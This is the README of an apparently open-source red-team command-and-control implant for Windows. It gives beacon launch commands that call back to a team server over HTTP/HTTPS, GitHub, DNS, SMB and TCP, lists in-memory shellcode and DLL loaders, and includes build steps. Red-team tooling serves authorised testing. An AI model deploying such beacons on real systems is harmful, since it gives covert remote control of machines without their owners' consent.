# Exploration C2 Implant

## What it is

Exploration is a rudimentary redteam Command and Control framework.  
This repository contain the Beacon in C++ to target windows.  
The TeamServer and Client can be found in [C2TeamServer](https://github.com/maxDcb/C2TeamServer).  

This project contains multiple beacon communicating with the TeamServer thought different means, here is some example:

```
# HTTP/HTTPS
BeaconHttp.exe IP_TEAMSERVER PORT_LISTENER http/https
BeaconHttp.exe 10.10.10.10 8443 https
BeaconHttp.exe 10.10.10.10 8080 http

# Github
BeaconGithub.exe user/project TOKEN
BeaconGithub.exe maxDcb/C2Implant ghp_dsfgdfhdf5554456g4fdg465...

# Dns
BeaconDns.exe DNS_SERVER DOM_TEAMSERVER
BeaconDns.exe 8.8.8.8 bac.superdomain.com

# Smb
BeaconSmb.exe PIPE_NAME
BeaconSmb.exe pipename2

# Tcp
BeaconTcp.exe IP_LISTENER PORT_LISTENER
BeaconTcp.exe 127.0.0.1 4444
```

## Build 

### Sumbodule & External Projects:  

* [Donut](https://github.com/TheWover/donut): Creat shellcode from PE files.  
* [CoffLoader](https://github.com/trustedsec/COFFLoader): Run object files from [CS-Situational-Awareness-BOF](https://github.com/trustedsec/CS-Situational-Awareness-BOF).
* [MemoryModule](https://github.com/fancycode/MemoryModule): Load DLL at runtime.
* [UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell): Powershell for unmanager code.
* [cpp-base64](https://github.com/ReneNyffenegger/cpp-base64): base64.
* [json](https://github.com/nlohmann/json): json parser.

### Build the Windows Beacons and Modules

* https://chocolatey.org/install
* choco install cmake --pre 

git submodule update --init   
mkdir buildWindows  
cd buildWindows 


#### Windows x64

with "x64 Native Tools Command Prompt for VS":  
cmake  -G "Visual Studio 17 2022" ..   
msbuild .\C2Implant.sln /property:Configuration=Release -m  
or  
compile the generated C2.sln in release with Visual studio (config Runtime Library Multi-threaded (/MT) & Release)   


#### Windows x86

cmake  -G "Visual Studio 17 2022" -A "Win32" ..   
msbuild .\C2Implant.sln /property:Configuration=Release /p:Platform=Win32 -m  


#### Production

Beacons are in: "Release\Beacons"  
Modules DLL in: "Release\Modules"   




